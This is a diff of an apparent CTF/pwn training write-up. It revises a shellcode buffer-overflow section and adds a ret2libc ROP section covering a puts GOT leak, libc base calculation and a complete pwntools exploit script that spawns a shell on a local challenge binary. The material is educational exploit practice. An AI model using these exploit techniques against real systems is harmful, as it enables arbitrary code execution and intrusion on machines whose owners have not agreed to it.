@@ -70,50 +70,28 @@ sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel
 
 ### Shellcode
 
-```
-#include<stdio.h>
+![alt text](/images/image-8.png)
 
-void init() {
-    setbuf(stdin, 0);
-    setbuf(stdout, 0);
-    setbuf(stderr, 0);
-}
+#### Use Ghidra to Decompile:
 
-void run(char name[]) {
-    char buf[524];
-    int c = 0;
-    puts("What's your name?");
-    printf("> ");
-    read(0, name, 80);
-    puts("What do you want for christmas?");
-    printf("> ");
-    read(0, buf, 544); 
-    return name;
-}
+![alt text](/images/image-7.png)
+![alt text](/images/image-6.png)
 
-int main() {
-    char name[80];
-    init();
-    run(name);
-    return 0;
-}
-```
-
-In `run()`, enter 80-byte `name[]` (no error because `name[]` is initialized to 80 bytes), then enter 544-byte `buf[]` (there is a buffer overflow error because `buf[]` is only initialized to 524 bytes).
+In `run()`, enter 80-byte `local_58` (no error because `local_58` is initialized to 80 bytes), then enter 544-byte `local_218` (there is a buffer overflow error because `local_218` is only initialized to 524 bytes).
 
 ![alt text](/images/image.png)
 
 `checksec` we see that `NX` is turned off => Stack can be executed => Shellcode when put on Stack will be executed.
 
-When debugging, enter `buf[]` of 544 bytes:
+When debugging, enter `local_218` of 544 bytes:
 
 ![alt text](/images/image-1.png)
 
-See that at `ret` the address has been overwritten by `buf` => has control over the program.
+See that at `ret` the address has been overwritten by `local_218` => has control over the program.
 
-To execute Shellcode, we need to let the program return a pointer to that Shellcode. `RAX` is pointing to the `name[]`, we use `RAX` to point to the Shellcode. Then `ret` to a gadget to call that Shellcode.
+To execute Shellcode, we need to let the program return a pointer to that Shellcode. `RAX` is pointing to the `local_58`, we use `RAX` to point to the Shellcode. Then `ret` to a gadget to call that Shellcode.
 
-Using gadget ```call rax;```
+Using gadget `call rax;`
 
 ![alt text](/images/image-3.png)
 
@@ -161,4 +139,138 @@ p.interactive()
 
 ![alt text](/images/image-5.png)
 
+---
 ### Return Oriented Programming (ROP)
+
+![alt text](/images/image-1-2.png)
+
+Use Ghidra to Decompile:
+
+![alt text](/images/image-2-0.png)
+
+Here there is a buffer overflow error in the `read` function when `local_58` is initialized to 80 but `read` allows input up to 120.
+
+![alt text](/images/image-2-2.png)
+
+We see here that there is no function that can create a shell, so we have to find a way to leak `libc's address`. Because when we get the address of libc, we can find the address of the `system` function and execute the function `system('/bin/sh')` to create a shell.
+
+![alt text](/images/image-3-2.png)
+
+We see that the address of binary is static and that of libc is dynamic. So we have to find a way to leak `libc's base address`.
+
+![alt text](/images/image-4-2.png)
+
+Because there is `no canary`, buffer overflow can be used to `return to libc`.
+
+![alt text](/images/image-5-2.png)
+
+First, we find the offset of `88`.
+
+There are 2 concepts here:
+```
+GOT: contains the addresses of libc functions. (0x403fd8)
+PLT: executes the function contained in GOT. (0x7ffff7e23bd0)
+```
+
+![alt text](/images/image-6-2.png)
+
+Next, in `puts("Say something: ")`, we see that only one parameter is needed to print the data of that parameter. So if we put the address `puts@got` into RDI (first parameter) and then execute `puts@plt`, we will leak the address of libc.
+
+We use `ropper` to find a gadget to control RDI:
+
+![alt text](/images/image-7-2.png)
+
+And that is `0x0000000000401263: pop rdi; ret;`
+
+```
+offset = 88
+pop_rdi = 0x0000000000401263
+
+payload  = b'A' * offset + p64(pop_rdi) + p64(exe.got.puts) + p64(exe.plt.puts)
+payload += p64(exe.sym.main)
+sla(b'\n', payload)
+```
+
+![alt text](/images/image-9-2.png)
+
+So we leak 6 address bytes. We see that at the end of the payload there is `exe.sym.main` so that after the leak is complete, the program will run again without ending. Next, we use the 6 leaked bytes to find the libc base address.
+
+![alt text](/images/image-8-2.png)
+![alt text](/images/image-10-2.png)
+
+```
+libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
+log.info("Leak libc: " + hex(libc_leak))
+libc.address = libc_leak - 0x87bd0
+log.info("Libc base: " + hex(libc.address))
+```
+
+To find the libc base, we use the leaked address subtract the base address while debugging to find the offset of `0x87bd0`. So we get libc base:
+
+![alt text](/images/image-11-2.png)
+
+When we get the libc base, we get the address of the `system` function and the string `'/bin/sh'` in libc. Final step, get shell:
+```
+payload  = b'A' * offset + p64(pop_rdi)
+payload += p64( next(libc.search('/bin/sh'))) + p64(libc.sym.system)
+sl(payload)
+```
+We have a complete exploit:
+```
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF('bof7', checksec=False)
+libc = exe.libc
+context.binary = exe
+
+info = lambda msg: log.info(msg)
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+sln = lambda msg, num: sla(msg, str(num).encode())
+sn = lambda msg, num: sa(msg, str(num).encode())
+
+def GDB():
+    if not args.REMOTE:
+        gdb.attach(p, gdbscript='''
+
+
+        c
+        ''')
+        input()
+
+
+if args.REMOTE:
+    p = remote('')
+else:
+    p = process(exe.path)
+# GDB()
+
+### LEAK LIBC ###
+offset = 88
+pop_rdi = 0x0000000000401263
+
+payload  = b'A' * offset + p64(pop_rdi) + p64(exe.got.puts) + p64(exe.plt.puts)
+payload += p64(exe.sym.main)
+sla(b'\n', payload)
+
+libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
+log.info("Leak libc: " + hex(libc_leak))
+libc.address = libc_leak - libc.sym.puts
+log.info("Libc base: " + hex(libc.address))
+
+### GET SHELL ###
+payload  = b'A' * offset + p64(pop_rdi)
+payload += p64( next(libc.search('/bin/sh'))) + p64(libc.sym.system)
+sl(payload)
+
+p.interactive()
+```
+
+![alt text](/images/image-12-2.png)
+---
+
+### Format String
